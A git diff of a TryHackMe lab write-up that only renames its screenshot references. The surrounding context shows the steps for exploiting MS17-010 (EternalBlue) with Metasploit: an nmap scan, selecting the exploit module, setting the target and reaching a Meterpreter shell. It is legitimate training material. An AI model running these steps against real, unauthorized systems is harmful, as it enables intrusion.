@@ -57,7 +57,7 @@ nmap -sC -sV -O <TARGET-IP>
 * Target identified as Windows 7 Professional SP1
 * Potentially vulnerable to MS17-010
 
-![Nmap Scan](screenshots/01_NmapScan\(1\).png)
+![Nmap Scan](screenshots/01_NmapScan.png)
 
 ---
 
@@ -67,7 +67,7 @@ nmap -sC -sV -O <TARGET-IP>
 msfconsole
 ```
 
-![Start Metasploit](screenshots/02_StartMsfcosole\(1\).png)
+![Start Metasploit](screenshots/02_StartMsfcosole.png)
 
 ---
 
@@ -83,7 +83,7 @@ Selected module:
 exploit/windows/smb/ms17_010_eternalblue
 ```
 
-![Search Exploit](screenshots/03_SearcheExploit\(1\).png)
+![Search Exploit](screenshots/03_SearcheExploit.png)
 
 ---
 
@@ -95,7 +95,7 @@ show options
 
 Verified required exploit parameters.
 
-![Show Options](screenshots/04_ShowOptions\(1\).png)
+![Show Options](screenshots/04_ShowOptions.png)
 
 ---
 
@@ -105,7 +105,7 @@ Verified required exploit parameters.
 set RHOSTS <TARGET-IP>
 ```
 
-![Set RHOSTS](screenshots/05_SetRHOSTS\(1\).png)
+![Set RHOSTS](screenshots/05_SetRHOSTS.png)
 
 ---
 
@@ -117,7 +117,7 @@ show payloads
 
 Selected a compatible payload.
 
-![Show Payloads](screenshots/06_ShowPayloads\(1\).png)
+![Show Payloads](screenshots/06_ShowPayloads.png)
 
 ---
 
@@ -130,7 +130,7 @@ exploit
 
 Successfully exploited the vulnerable SMB service.
 
-![Payload and Exploit](screenshots/07_SetPayoad\&Exploit\(1\).png)
+![Payload and Exploit](screenshots/07_SetPayoad\&Exploit.png)
 
 ---
 
@@ -142,7 +142,7 @@ Successfully obtained a Meterpreter shell.
 meterpreter >
 ```
 
-![Meterpreter Session](screenshots/08_SessionEstablished\(1\).png)
+![Meterpreter Session](screenshots/08_SessionEstablished.png)
 
 ---
 
@@ -150,7 +150,7 @@ meterpreter >
 
 Successfully completed the TryHackMe Metasploit Introduction room.
 
-![Room Completed](screenshots/09_Completed Successfully (1).png)
+![Room Completed](screenshots/09_CompletedSuccessfully.png)
 
 ---
 
